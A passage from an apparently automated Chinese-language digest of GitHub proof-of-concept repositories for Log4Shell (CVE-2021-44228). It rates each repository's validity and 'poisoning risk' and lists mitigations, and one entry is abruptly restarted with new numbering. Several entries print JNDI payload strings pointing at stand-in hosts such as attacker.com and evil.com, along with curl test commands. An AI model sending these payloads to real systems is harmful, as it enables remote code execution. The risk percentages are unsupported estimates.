提供的POC代码（技术分析文档）描述了该漏洞的原理，受影响版本以及利用过程，可以辅助构建PoC。漏洞利用的有效性取决于目标系统是否使用了受影响的Log4j2版本，并且是否允许出站网络连接到攻击者的JNDI服务器。由于 Log4Shell 在野外被广泛利用，因此认为提供的分析是基于真实可利用的漏洞的。

**投毒风险：**

提供的代码主要为技术分析文档，本身不包含可直接执行的恶意代码。但是，任何代码仓库都存在一定程度的投毒风险。在这种情况下，如果攻击者成功篡改了仓库中的分析文档，他们可能会插入误导性信息或隐藏的恶意链接，从而诱导用户下载或执行恶意软件。风险评估为10%，因仓库主要为分析文档，直接嵌入恶意代码可能性较低。

**项目地址:** [PCMKUIT/CVE-2021-44228---Log4Shell-Analysis](https://github.com/PCMKUIT/CVE-2021-44228---Log4Shell-Analysis)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #12

**来源**: [CVE-2021-44228-SerpilRivas_log4shell-homework9.md](../2021/CVE-2021-44228-SerpilRivas_log4shell-homework9.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标应用程序使用受影响版本的 Log4j2，且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的严重漏洞。攻击者可以通过发送特制的字符串，其中包含 JNDI 查找，利用此漏洞执行任意代码。当 Log4j2 尝试记录这些字符串时，它会通过 JNDI 查找连接到攻击者控制的 LDAP 或其他 JNDI 服务，并执行恶意代码。

**漏洞利用方式：**

1.  攻击者发送包含`${jndi:<协议>://<攻击者服务器>/<资源>}`的恶意请求到目标系统。`${jndi}`是触发漏洞的关键部分，它指示 Log4j2 执行 JNDI 查找。
2.  目标系统使用 Log4j2 记录该请求。
3.  Log4j2 解析该字符串并尝试连接到攻击者指定的 JNDI 服务器（例如，LDAP）。
4.  JNDI 服务器返回恶意代码（例如，Java class 文件）。
5.  Log4j2 加载并执行该恶意代码，导致远程代码执行。

**POC有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞非常有效，并被广泛利用。提供的 Dockerfile 和 `docker-compose.yml` 文件用于构建一个包含易受攻击的 Log4j2 版本的应用程序。`ldap_server.py` 模拟了一个恶意的 LDAP 服务器，用于提供攻击载荷。使用`curl http://localhost:8080?input=${jndi:ldap://localhost:8000/Exploit}`命令验证漏洞利用过程。

**投毒风险：**

分析提供的代码，投毒风险较低，约为 5%。主要依据如下：

*   `ldap_server.py` 仅用于模拟攻击，本身不包含任何恶意代码，只返回“Exploit payload simulated.”字符串。
*   Dockerfile 构建的镜像是使用受漏洞影响的Log4j2，目的是为了验证漏洞，不是为了投毒。
*   `pom.xml` 文件指定了 Log4j2 的版本为 2.17.1, 此版本已经修复了漏洞，但README.md文件中提到使用了存在漏洞的2.14.1版本，存在描述不一致，且依赖版本管理不严谨
*   虽然主体没有明显的投毒代码，但在真实环境中，攻击者可能会替换 `ldap_server.py` 中的 payload，或者修改 Dockerfile 构建恶意镜像。因此存在潜在的风险。
*   README.md文件描述了缓解措施，较为完备。

总体而言，提供的代码主要是用于漏洞演示和验证，而非恶意投毒。但开发者仍需保持警惕，在实际应用中注意代码审查和依赖管理。

**项目地址:** [SerpilRivas/log4shell-homework9](https://github.com/SerpilRivas/log4shell-homework9)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #13

**来源**: [CVE-2021-44228-ShlomiRex_log4shell_lab.md](../2021/CVE-2021-44228-ShlomiRex_log4shell_lab.md)

## CVE-2021-44228 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且允许外部网络访问，日志记录功能开启并且记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的安全漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**漏洞利用方式：**

该漏洞源于Log4j2中的JNDI（Java Naming and Directory Interface）功能，该功能允许从LDAP和其他JNDI相关端点加载代码。当攻击者能够控制日志消息或日志消息参数时，他们可以利用此功能执行从LDAP服务器加载的任意代码。攻击者通过在Log4j2可以解析的日志消息中插入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`，来触发该漏洞。当Log4j2尝试解析此字符串时，它会向`attacker.com`上的LDAP服务器发出请求，并执行从该服务器返回的Java代码。

提供的POC代码利用了这一点，使用`docker-compose`快速搭建了一个包含漏洞应用(`vul`)、LDAP服务器(`ldap_server`)和恶意代码服务器(`exploit_server`)的实验环境。利用步骤如下：

1.  使用`docker-compose up -d`启动实验环境。
2.  使用`curl`命令向漏洞应用发送包含恶意JNDI查找字符串的HTTP请求，例如：`curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`。 其中`my_ldap_server`指向 docker-compose 启动的 ldap_server。
3.  LDAP服务器将请求重定向到恶意代码服务器，下载并执行恶意代码。
4.  验证漏洞是否成功利用，通常通过检查`vul`容器上的文件或观察其他系统行为。

**有效性：**

根据漏洞描述、搜索引擎结果和提供的POC代码，可以判断该POC代码是有效的。大量的安全报告和漏洞分析都确认了CVE-2021-44228的可利用性，并且该POC代码提供了一个易于部署的实验环境，用于验证该漏洞。

**投毒风险：**

评估该POC代码的投毒风险较低，大约10%。原因如下：

*   **明确的用途：** 该代码库旨在提供一个用于演示和测试Log4Shell漏洞的实验环境，其主要功能是复现漏洞，方便用户理解和学习。
*   **可见的组件：** 该代码库包含了`docker-compose.yml`文件以及构建LDAP服务器、恶意代码服务器的Dockerfile，这些文件是公开可见的，便于用户检查和审计。
*   **简单的逻辑：** 实验环境的搭建和漏洞利用流程相对简单，易于理解和验证。
*   **潜在的风险：** 尽管该代码库的主要目的是演示漏洞利用，但仍存在潜在的风险。例如，如果用户直接在生产环境中使用该代码库，可能会暴露其系统，受到攻击。此外，恶意攻击者可能会修改该代码库，添加恶意代码，然后传播给不知情的用户。但考虑到公开的性质和广泛的审查，直接包含恶意代码的可能性较低。

**风险缓减：**
* 下载代码后,仔细检查`docker-compose.yml`以及Dockerfile文件,确保没有恶意配置或者代码.
* 运行前务必搭建隔离环境,避免直接在生产环境中使用.

**项目地址:** [ShlomiRex/log4shell_lab](https://github.com/ShlomiRex/log4shell_lab)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #14

**来源**: [CVE-2021-44228-Sorrence_CVE-2021-44228.md](../2021/CVE-2021-44228-Sorrence_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，并且开启了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 特性，从恶意的 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的PoC代码有效。它通过构造包含 JNDI LDAP 查找的 HTTP Header (X-Api-Version) 发送到目标，目标如果存在漏洞，将会触发一个回调到攻击者指定的 LHOST。

**投毒风险：**
代码本身相对简单，主要功能是发送包含恶意 JNDI payload 的 HTTP 请求并监听回调。可能的投毒风险在于：
*   **依赖风险：** 代码使用了 `net/http` 和 `net` 包。虽然是标准库，但如果编译过程中存在恶意替换或者构建环境被污染，可能存在风险。此风险较低，估计在10%左右。
*   **LHOST欺骗：** PoC 代码强制要求用户指定回调 LHOST。攻击者可能诱导受害者使用受控的 LHOST，从而获取受害者目标系统的相关信息，或者进行中间人攻击。但这不是代码本身的投毒，而是使用方式上的欺骗。
*   **LDAP 服务器风险：** 代码中的 `jndi:ldap://%s:1389/a` 指向的 LDAP 服务器是攻击者控制的。这意味着攻击者可以在 LDAP 服务器上放置恶意 Java 对象，从而在受害者系统上执行任意代码。

由于该PoC的目的是验证漏洞，并且代码相对简单，因此直接隐藏恶意代码的可能性较低。主要的风险在于运行环境和攻击者控制的LDAP服务器。

**利用方式：**
1.  **漏洞触发：** 攻击者向目标系统发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的请求。该字符串会被 Log4j2 解析为 JNDI 查找。
2.  **JNDI 注入：** Log4j2 通过 JNDI 接口向指定的 LDAP 服务器 (attacker.com) 发起请求。
3.  **恶意代码加载：** 攻击者控制的 LDAP 服务器返回一个包含恶意 Java 对象的响应。
4.  **远程代码执行：** Log4j2 反序列化该 Java 对象，导致任意代码在目标系统上执行。

**缓解措施：**
*   升级 Log4j2 到 >= 2.16.0 版本，该版本完全移除了 JNDI 功能。
*   如果无法升级，设置 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量来禁用 message lookup substitution。
*   使用防火墙或网络策略限制对外部 LDAP 服务器的访问。

**项目地址:** [Sorrence/CVE-2021-44228](https://github.com/Sorrence/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #15

**来源**: [CVE-2021-44228-Super-Binary_cve-2021-44228.md](../2021/CVE-2021-44228-Super-Binary_cve-2021-44228.md)

# CVE-2021-44228

> 📦 该CVE有 **41** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-44228-0xInfection_LogMePwn.md](../2021/CVE-2021-44228-0xInfection_LogMePwn.md)

## CVE-2021-44228 - Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过构造包含 JNDI 查找的恶意日志消息，从而在目标服务器上执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** Log4j2 允许在日志消息中使用 JNDI 查找，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 尝试解析这些查找时，它会连接到指定的 JNDI 服务器（例如 LDAP），并检索 Java 对象。如果攻击者可以控制日志消息的内容，他们就可以让 Log4j2 连接到恶意的 JNDI 服务器，该服务器会返回包含恶意代码的 Java 对象，Log4j2 反序列化这个对象从而导致任意代码执行。

2.  **利用方式：**
    *   攻击者需要找到一个途径，可以将恶意 JNDI 查找字符串注入到应用程序的日志消息中。这可能通过 HTTP 请求头、POST 请求参数、Websocket 消息等实现。
    *   攻击者控制的 JNDI 服务器（例如 LDAP 服务器）需要返回一个包含恶意代码的 Java 对象。这通常通过一个恶意的 Java 类来实现，该类在加载时执行任意代码。

3.  **漏洞代码评估：** 提供的漏洞利用代码看起来像一个通用的漏洞扫描器，可以扫描各种协议，并允许自定义 payload。它本身不包含直接的攻击载荷,但是如果扫描器被用于发送恶意 JNDI 查找字符串，则它就可以被用来触发 CVE-2021-44228。

4.  **投毒风险分析：** 虽然提供的CHANGELOG和LICENSE文件看起来无害，但仓库中其他未提供代码的可能性也存在。扫描器本身允许自定义payload，可能包含恶意软件，用户应该小心使用，因此存在一定的投毒风险（估计为 10%）。这个百分比考虑了代码扫描器可能被用来传播恶意 payload的可能性，即使其核心功能并非恶意。

5.  **缓解措施：**
    *   升级 Log4j2 到 >=2.17.1 版本。
    *   禁用 JNDI 查找功能（如果不需要）。
    *   设置 `log4j2.formatMsgNoLookups=true` 属性。


**项目地址:** [0xInfection/LogMePwn](https://github.com/0xInfection/LogMePwn)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #2

**来源**: [CVE-2021-44228-0xsyr0_Log4Shell.md](../2021/CVE-2021-44228-0xsyr0_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version < 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。需要目标服务器开启JNDI功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以通过发送特制的日志请求，利用Log4j2的JNDI功能来执行任意代码。\n\n**漏洞利用方式：**\n\n1.  攻击者向使用存在漏洞的Log4j2组件的应用程序发送包含恶意JNDI查找字符串的请求。例如： `${jndi:ldap://attacker.com/evil}`\n2.  Log4j2在记录日志时，会解析该JNDI字符串，并尝试通过LDAP协议连接到攻击者控制的服务器（attacker.com）。\n3.  攻击者的LDAP服务器返回一个包含Java对象的引用。\n4.  Log4j2尝试加载并实例化该Java对象，从而导致攻击者控制的代码在服务器上执行。\n\n**有效性：** 根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。该漏洞已被广泛利用，并且互联网上存在大量的POC和利用工具。\n\n**投毒风险：**\n查看了提供的“漏洞利用代码”仓库的内容列表，主要包含以下信息:\n*   Advisory.md：提供漏洞相关的建议和缓解措施的链接。\n*   Exploitation.md：提供漏洞利用相关的链接，例如渗透测试指南和JNDI注入工具。\n*   Honeypots.md：提供蜜罐相关的链接。\n*   IOCs-Callback-Domains-IP-Addresses.md：提供IOC（Indicator of Compromise）和回调URL/IP地址的链接。\n*   Malware-Reports.md：提供恶意软件报告的链接。\n*   Mitigations-Fixes.md：提供缓解和修复措施的链接。\n*   Payloads-Obfuscation-WAF-Bypass.md：提供payload、混淆和WAF绕过相关的链接。\n\n总体而言，这个仓库主要是一个资源链接的集合，提供了关于CVE-2021-44228（Log4Shell）的各种信息，包括漏洞建议、利用方法、IOC、缓解措施和payload。\n\n其中`Exploitation.md`文件中链接的`JNDI-Injection-Exploit`、`JNDI-Exploit-Kit`和`marshalsec`等工具本身就是漏洞利用工具，如果用户下载并使用这些工具，可能会面临安全风险，例如被植入后门或恶意代码，或者被用于非法用途。但是这些工具本身是为了复现和验证漏洞使用的，并非作者投毒。\n仓库本身提供的信息比较杂乱，需要使用者具备一定的安全知识才能正确评估和使用。存在一定的误导性，有可能被不具备安全知识的人误用，或者被用于恶意目的，因此评估投毒风险为10%。

**项目地址:** [0xsyr0/Log4Shell](https://github.com/0xsyr0/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #3

**来源**: [CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md](../2021/CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 至 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 log4j-core 并且启用了消息查找替换功能。攻击者需要能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞。攻击者可以通过在日志消息中插入恶意的 JNDI 查找字符串，利用 JNDI 功能从远程 LDAP 服务器加载和执行任意代码。 

**利用方式：**

1.  攻击者发送包含恶意 JNDI 查找字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，到目标应用程序。
2.  如果目标应用程序使用 Log4j2 记录该请求，Log4j2 将尝试解析该 JNDI 字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**有效性：**

提供的 POC 代码（Vulhub 环境配置）有效，用于搭建一个可重现 Log4Shell 漏洞的环境。它通过 Docker-Compose 部署一个包含漏洞的 Apache Solr 实例，方便研究人员进行漏洞复现和分析。

**投毒风险：**

该仓库本身主要提供的是漏洞复现环境的配置，投毒风险较低。但是，使用任何第三方代码库或环境时，都需要谨慎评估潜在的风险。这里存在一定风险，因为攻击者可能篡改该仓库，在 LDAP 服务器返回的恶意 Java 类中植入恶意代码，使得利用漏洞时执行预期之外的操作。 因此评判投毒风险为10%，主要为潜在的供应链攻击风险。

**项目地址:** [Alan-coder-eng/log4j-cve-2021-44228-](https://github.com/Alan-coder-eng/log4j-cve-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #4

**来源**: [CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md](../2021/CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j 2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 应用程序使用Log4j 2记录不受信任的输入，且未进行修复或缓解。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j 2中的一个远程代码执行漏洞。攻击者可以通过构造包含JNDI查找的恶意字符串，当Log4j 2记录该字符串时，会触发JNDI查找，从而从攻击者控制的LDAP服务器加载并执行恶意Java类。

**有效性：**
提供的POC代码有效。它展示了如何通过在HTTP请求头中注入`${jndi:ldap://evil.com/exploit}`这样的payload来触发漏洞。当应用程序记录User-Agent头时，Log4j 2会尝试解析该字符串，执行JNDI查找，并从evil.com加载恶意代码。

**投毒风险：**
分析提供的README.md文件，投毒风险较低，约为10%。主要风险在于以下几点：
* **依赖性风险：** 任何开源项目都存在依赖性风险。如果恶意作者控制了项目依赖的某个组件，则可能通过供应链攻击进行投毒。
* **人为因素：** 尽管README.md本身没有发现直接的恶意代码，但用户在使用过程中可能会受到误导，例如，将测试用的恶意LDAP服务器配置错误，导致意外的攻击或数据泄露。

**漏洞利用方式：**
1.  **攻击者构造恶意Payload：** 攻击者构造一个包含JNDI查找的payload，例如`${jndi:ldap://attacker.com/a}`。
2.  **注入Payload：** 攻击者将payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent、X-Forwarded-For等）、POST请求参数、WebSocket消息等。
3.  **触发日志记录：** 应用程序使用Log4j 2记录包含恶意payload的输入。
4.  **JNDI查找：** Log4j 2解析payload，执行JNDI查找，向attacker.com发起LDAP请求。
5.  **加载恶意代码：** 攻击者的LDAP服务器返回一个包含恶意Java类的响应。
6.  **远程代码执行：** Log4j 2加载并执行该Java类，导致远程代码执行。

**缓解措施：**
*   升级Log4j 2到最新版本 (>= 2.17.1)。
*   从JAR文件中删除`JndiLookup.class`。
*   设置系统属性`log4j2.formatMsgNoLookups=true`来禁用消息查找。
*   使用防火墙或出口ACL阻止出站LDAP/RMI流量。
*   在WAF/IDS规则中阻止`${jndi:` payload。

**项目地址:** [B1ack4sh/Blackash-CVE-2021-44228](https://github.com/B1ack4sh/Blackash-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #5

**来源**: [CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md](../2021/CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接到攻击者的 LDAP/HTTP 服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的远程代码执行漏洞。攻击者可以通过构造特殊的日志消息，利用 JNDI 注入来执行任意代码。 

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的PoC代码有效。搜索结果表明该漏洞是真实存在的，并且有许多利用实例。

**投毒风险：**
分析提供的PoC代码，投毒风险很低。 
*   `LICENSE`: MIT许可，标准开源许可。 
*   `README.md`: 提供了PoC的详细信息，包括所需环境，操作步骤和WAF绕过方式等。 
*   `docker-compose.yaml`: 定义了frontend(React SPA)和backend(Spring Boot)两个服务, 其中backend使用了存在漏洞的Log4j2。 
*   `init.sh`: 这个脚本用于在攻击者机器上设置攻击环境。它编译JNDI利用所需的Java类，启动一个HTTP服务器来提供这些类，并启动一个LDAP服务器以响应JNDI查询。这个脚本是攻击的核心组成部分，但它本身的目的就是为了演示漏洞利用，不属于恶意投毒。它确实会下载编译好的文件到攻击者机器上，但这是漏洞利用的正常流程,本身不构成投毒。 但使用未经审核的脚本始终存在一定的风险，所以给了1%的风险.

**利用方式：**
1.  攻击者向目标系统发送包含恶意 JNDI 注入字符串的请求。该字符串形如`${jndi:ldap://attacker_host:ldap_port/Exploit}`。
2.  目标系统使用 Log4j2 记录该请求。由于存在漏洞，Log4j2 会解析 JNDI 字符串，并尝试通过 LDAP 协议连接到攻击者的服务器。
3.  攻击者的 LDAP 服务器返回一个指向 HTTP 服务器的响应，指示目标系统下载并执行一个 Java 类。
4.  目标系统下载并执行该 Java 类，从而实现远程代码执行。

**缓解措施：**
*   升级到 Log4j2 的安全版本 (>= 2.17.0)。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups=true` 阻止 JNDI 查找。
*   使用 Web 应用防火墙 (WAF) 检测和阻止恶意的 JNDI 注入字符串。

**项目地址:** [Carlos-Mesquita/TPASLog4ShellPoC](https://github.com/Carlos-Mesquita/TPASLog4ShellPoC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #6

**来源**: [CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md](../2021/CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致完全服务器接管

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标应用使用了受影响版本的Log4j2，并且允许通过用户可控的输入来记录日志。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向服务器发送特制的字符串，该字符串包含JNDI查找，从而利用此漏洞。当Log4j2尝试记录此字符串时，它会执行JNDI查找，导致服务器从攻击者控制的LDAP服务器下载并执行恶意代码。 

**漏洞利用方式：**

1.  攻击者向目标系统发送包含恶意JNDI查找的请求。例如： `${jndi:ldap://attacker.com/evil}` 
2.  如果目标系统使用受影响的Log4j2版本记录此请求，Log4j2将尝试执行JNDI查找。 
3.  Log4j2连接到攻击者控制的LDAP服务器(`attacker.com`)。 
4.  LDAP服务器返回一个包含恶意Java类的URL。 
5.  Log4j2从该URL下载并执行恶意Java类，导致远程代码执行。 

**POC有效性：**

从提供的`pom.xml`文件可以看出，POC代码使用了`log4j-core`和`log4j-api`的2.14.1版本，该版本受到CVE-2021-44228漏洞的影响。因此，如果部署包含此Log4j2版本的Web应用，则攻击者可以通过发送恶意payload触发漏洞。`forgotpass.java`文件展示了如何从request中获取参数，并将其拼接到输出中，这可能是触发漏洞的点，攻击者可以在username参数中插入恶意payload.

**投毒风险：**

分析提供的代码，`forgotpass.java`看似存在XSS漏洞，该文件只是简单地将用户输入（username）插入到HTML的JavaScript代码中，使其能弹出一个prompt窗口，之后跳转到主页。没有发现明显的用于进行恶意利用的代码，如反弹shell或进行其他类型的远程控制操作。 `log4j.java` 是一个Logger类，没有实际逻辑。 总体而言，仓库中存在隐藏的投毒代码的可能性较低，估计在10%左右。主要考虑到作者可能在LDAP服务器上部署恶意java文件，从而进行投毒。需要更深入的分析才能确定是否存在更隐蔽的投毒行为。

**项目地址:** [Fauzan-Aldi/Log4j-_Vulnerability](https://github.com/Fauzan-Aldi/Log4j-_Vulnerability)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #7

**来源**: [CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md](../2021/CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md)

## CVE-2021-44228 Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，并且允许攻击者控制Log4j2的日志消息或日志消息参数

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**有效性：**
漏洞库信息明确指出，在特定版本的Log4j2中，JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。如果攻击者可以控制日志消息或日志消息参数，并且启用了消息查找替换，则可以执行从LDAP服务器加载的任意代码。因此，可以判定漏洞利用代码有效。

**投毒风险：**
提供的漏洞利用代码只是一个GNU GPL v2许可协议的文本文件，不是漏洞利用的payload或者脚本，不包含任何可执行的代码，因此，不存在投毒代码。投毒风险为0%。

**利用方式：**
该漏洞的利用方式是，攻击者构造包含JNDI查找的恶意字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2记录此字符串时，它会尝试解析JNDI查找。这将导致Log4j2通过LDAP协议连接到攻击者控制的服务器`attacker.com`。攻击者可以在其LDAP服务器上托管一个恶意Java类，当Log4j2连接到LDAP服务器时，该类将被下载并执行，从而导致远程代码执行。需要注意的是，从Log4j 2.15.0开始，此行为已默认禁用，并在版本2.16.0中完全删除（以及2.12.2、2.12.3和2.3.1）。


**项目地址:** [KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device](https://github.com/KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #8

**来源**: [CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md](../2021/CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用了受影响版本的Log4j2，且允许JNDI查找

**POC 可用性:** 是

**投毒风险:** 2%

## 详情

CVE-2021-44228 存在于 Apache Log4j2 中，利用了 JNDI 注入漏洞，攻击者通过控制日志消息或日志消息参数，可以执行从 LDAP 服务器加载的任意代码。利用方式如下：

1.  **构造恶意 JNDI 注入 Payload：** 攻击者构造包含 JNDI 查找的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  **触发 Log4j2 记录 Payload：** 将恶意 Payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头、POST 参数、用户输入等。
3.  **Log4j2 解析 Payload 并执行 JNDI 查找：** 当 Log4j2 记录包含恶意 Payload 的日志消息时，它会尝试解析 JNDI 查找。
4.  **连接到恶意 LDAP 服务器：**  Log4j2 会连接到攻击者控制的 LDAP 服务器（attacker.com）。
5.  **执行任意代码：** 恶意 LDAP 服务器会返回一个包含恶意 Java 类的响应，Log4j2 会加载并执行该类，从而导致远程代码执行。

**投毒风险分析：**

尽管该存储库提供了有价值的 PoC 和利用信息，但仍然存在作者投毒代码的微小风险。例如，LDAP 服务器响应中包含的恶意 Java 类可能包含后门，或在其他位置下载并执行恶意代码。为了将风险降至最低，应彻底审查提供的任何代码，并仅从受信任的来源下载所需的工具。

**项目地址:** [LucasPDiniz/CVE-2021-44228](https://github.com/LucasPDiniz/CVE-2021-44228)

